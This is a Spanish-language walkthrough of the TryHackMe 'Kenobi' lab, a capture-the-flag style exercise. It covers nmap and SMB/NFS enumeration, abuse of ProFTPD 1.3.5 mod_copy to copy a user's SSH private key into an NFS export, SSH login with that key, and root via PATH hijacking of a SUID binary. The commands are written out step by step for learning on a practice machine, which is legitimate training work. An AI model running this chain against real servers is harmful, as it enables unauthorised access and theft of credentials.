### **Tutorial: Explotación de la máquina Kenobi – TryHackMe**

Este laboratorio muestra el proceso de reconocimiento, enumeración, acceso inicial y escalada de privilegios en una máquina vulnerable del laboratorio de TryHackMe.

## 1. Conexión a la VPN de TryHackMe

Para acceder a las máquinas del laboratorio es necesario conectarse previamente a la VPN de TryHackMe. Esto crea un túnel seguro entre la máquina Kali Linux y la red privada donde se encuentran los sistemas vulnerables.

### 1.1 Conexión mediante OpenVPN

Desde la terminal de Kali se ejecuta el siguiente comando utilizando el archivo .ovpn descargado desde la plataforma:

```bash
sudo openvpn /home/nerea/Descargas/eu-central-1-nereacandonramos-regular.ovpn
```

Si la conexión se establece correctamente aparecerá el siguiente mensaje:

```bash
Initialization Sequence Completed
```

Esto indica que la conexión VPN se ha realizado correctamente.
Si vemos que no funciona, probar otro archivo de configuración hasta que se vea conectado en vez de central, poner west..


## 2. Escaneo de puertos con Nmap

El siguiente paso consiste en identificar los servicios expuestos en la máquina objetivo mediante un escaneo completo de puertos.

```bash
nmap -sV -sC 10.129.174.100
```
![nmap](Maquina_de_Linux/Kenobi-badr/imagenes/nmap.png)

El escaneo revela los siguientes servicios abiertos:

- 21/tcp → FTP (ProFTPD 1.3.5)
- 22/tcp → SSH
- 80/tcp → HTTP (Apache 2.4.41)
- 111/tcp → RPC
- 139/445 → SMB
- 2049 → NFS

Además, se identifica en el archivo robots.txt la siguiente ruta oculta:

```bash
/admin.html
```
Vemos que tiene recursos compartidos y que podemos acceder a uno de ellos como usuario anónimo , por lo que vamos a probar mediante smbclient a conectarnos la maquina y ver si podemos listar algo.


## 3. Enumeración del servicio SMB

Se enumeran los recursos compartidos disponibles en el servidor:

```bash
 smbclient //10.129.174.100/anonymous
 ```
Miramos dentro de la carpeta que hemos encontrados

```bash
 dir
```
Vemos un archivo llamado log.txt el cual nos descargamos a nuestra maquina con el comando get.

```bash
get log.txt
```
![smb](Maquina_de_Linux/Kenobi-badr/imagenes/smb.png)

Una vez descargado en nuestra máquina, se analiza el archivo en busca de información relevante.

En su contenido se observa información sobre el servicio FTP que se está ejecutando en el puerto 21 (ProFTPD), así como indicios de la generación de claves utilizadas para el acceso por SSH.

Por otro lado, en el escaneo realizado con Nmap también se identificó el puerto 111 abierto, correspondiente al servicio RPCBIND.

![cat](Maquina_de_Linux/Kenobi-badr/imagenes/cat.png)


## 4. Enumeración avanzada del servicio NFS

Para profundizar en el servicio NFS, realizamos un escaneo específico con scripts de Nmap:

```bash
nmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount 10.129.147.162
```

El resultado nos proporciona información muy interesante:

El recurso compartido disponible es:

```bash
/var *
```
![111](Maquina_de_Linux/Kenobi-badr/imagenes/111.png)

Esto indica que el directorio /var está exportado y accesible.


### 4.1 Análisis de permisos

El script nfs-ls nos muestra el contenido del recurso y sus permisos:

Podemos ver múltiples directorios como:

- backups
- log
- www
- tmp 

Pero lo más importante es esto:

```bash
access: Read Lookup NoModify NoExtend NoDelete NoExecute
```

Esto significa:

- Podemos leer archivos
- No podemos modificarlos directamente

Aun así, esto es suficiente para la explotación.


## 5. Explotación del servicio FTP (ProFTPD – mod_copy)

En el archivo log.txt obtenido anteriormente, se identificó que el servidor FTP está ejecutando ProFTPD 1.3.5.

Al buscar vulnerabilidades con:

```bash
searchsploit proftpd 1.3.5
```
![search](Maquinas_de_Linux/Kenobi-badr/imagenes/search.png)

![search2](Maquinas_de_Linux/Kenobi-badr/imagenes/search2.png)

Se encuentra un módulo vulnerable llamado mod_copy, que permite copiar archivos dentro del servidor sin necesidad de autenticación.

Este módulo utiliza los comandos:

- SITE CPFR → selecciona el archivo origen
- SITE CPTO → define la ruta destino


## 6. Conexión al servicio FTP

Nos conectamos al puerto 21 mediante nc y copiamos la clave con los comandos SITE CPFR y SITE CPTO al directorio /var ya que sabemos que era un montaje gracias a toda la enumeración de la etapa anterior.

```bash
nc 10.129.147.162 21
```

Si la conexión es correcta, veremos el banner del servicio:

```bash
220 ProFTPD 1.3.5 Server
```

Ahora utilizamos este comando para seleccionar el archivo

```bash
SITE CPFR /home/kenobi/.ssh/id_rsa (copia el archivo especificado)
```
Utilizamos este otro para enviarlo a la ruta que queremos

```bash
SITE CPTO /var/tmp/id_rsa (envía el archivo copiado al destino que le hemos indicado)
```

![nc](Maquina_de_Linux/Kenobi-badr/imagenes/nc.png)


## 7. Montaje del directorio NFS y obtención de la clave privada

Antes de poder acceder a la clave privada que hemos copiado con el exploit de FTP, es necesario montar el directorio /var en nuestra máquina, ya que este servicio está expuesto mediante NFS.


### 7.1 Montaje del recurso NFS

Creamos un directorio donde montarlo (requiere privilegios de superusuario):

```bash
sudo mkdir /mnt/kenobi
```

Montamos el recurso compartido:

```bash
sudo mount -t nfs 10.129.147.162:/var /mnt/kenobi
```

### 7.2 Acceso al directorio montado

Accedemos al punto de montaje:

```bash
cd /mnt/kenobi
```

```bash
ll
```
![nc](Maquina_de_Linux/Kenobi-badr/imagenes/ll.png)


### 7.3 Obtención de la clave privada

Nos dirigimos al directorio tmp, donde previamente copiamos la clave:

```bash
cd tmp
```

```bash
ll
```
![cd](Maquina_de_Linux/Kenobi-badr/imagenes/tmp.png)

Aquí encontraremos el archivo:

```bash
id_rsa
```
Vamos a mirar dentro del archivo.

```bash
cat id_rsa
```
![cat](Maquina_de_Linux/Kenobi-badr/imagenes/key.png)

Vamosa copiar la clave privada.

```bash
cp id_rsa ~/id_rsa_kenobi
 ```

Asignamos los permisos adecuados a la clave privada para que pueda ser utilizada por SSH:

```bash
chmod 600 ~/id_rsa_kenobi
```
![600](Maquina_de_Linux/Kenobi-badr/imagenes/cp.png)


## 8. Acceso inicial mediante SSH

Una vez tenemos la clave privada, procedemos a conectarnos al servicio SSH como el usuario kenobi:

```bash
ssh -i ~/id_rsa_kenobi kenobi@10.129.147.162
```

Si la conexión es correcta, obtendremos acceso al sistema.

![ssh](Maquina_de_Linux/Kenobi-badr/imagenes/ssh.png)


## 9. Escalada de privilegios

Una vez dentro de la máquina, buscamos binarios con permisos SUID que puedan ser explotados:

```bash
find / -perm -u=s -type f 2>/dev/null
```
- find /: Búsqueda desde la raíz
- -perm: Indicamos en base a que permisos se hará la búsqueda
- -u=s: indicamos los permisos SUID
- 2>/dev/null: Indicamos mande los errores a una especie de agujero negro en linux

![find](Maquina_de_Linux/Kenobi-badr/imagenes/find.png)

El binario “ /usr/bin/menú” ejecuta un script con 3 tareas: status check, kernel versión e ifconfig.

```bash
/usr/bin/menu
```

```bash
1
```

![usr](Maquina_de_Linux/Kenobi-badr/imagenes/usr.png)

Este script nos automatiza 3 procesos y hace los mismo que si lo hiciéramos manual con:

- Curl -I localhost → nos daria el status check.
- Uname -r → nos daría kernel versión.
- Ifconfig → Muestra información acerca de las interfaces de red.


## 9.2 Explotación mediante PATH Hijacking

Creamos un archivo malicioso llamado curl, ya que es uno de los comandos utilizados por el binario:

```bash
echo "/bin/bash" > /tmp/curl
```

```bash
chmod +x /tmp/curl
```
Modificamos la variable PATH para que el sistema ejecute nuestro archivo antes que el original:

```bash
export PATH=/tmp:$PATH
```
Ejecutamos nuevamente el binario:

```bash
/usr/bin/menu
```
Seleccionamos la opción que utiliza curl.

![echo](Maquina_de_Linux/Kenobi-badr/imagenes/echo.png)


## 10. Obtención de acceso root

Si la explotación ha sido exitosa, se abrirá una shell con privilegios de root.

Comprobamos:

```bash
whoami
```
Resultado:

```bash
root
```
![root](Maquina_de_Linux/Kenobi-badr/imagenes/root.png)